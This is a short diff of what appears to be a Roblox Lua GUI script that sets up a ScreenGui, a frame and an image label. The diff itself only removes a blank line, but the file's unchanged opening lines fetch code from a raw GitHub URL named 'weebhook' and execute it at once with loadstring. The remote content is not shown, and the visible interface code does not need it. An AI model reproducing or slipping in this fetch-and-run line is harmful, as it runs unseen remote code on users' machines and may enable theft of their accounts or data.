@@ -1,7 +1,6 @@
 wait(0)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/page3/main/weebhook"))()
 
-
 local ScreenGui = Instance.new("ScreenGui")
 local Page3 = Instance.new("Frame")
 local ImageLabel = Instance.new("ImageLabel")
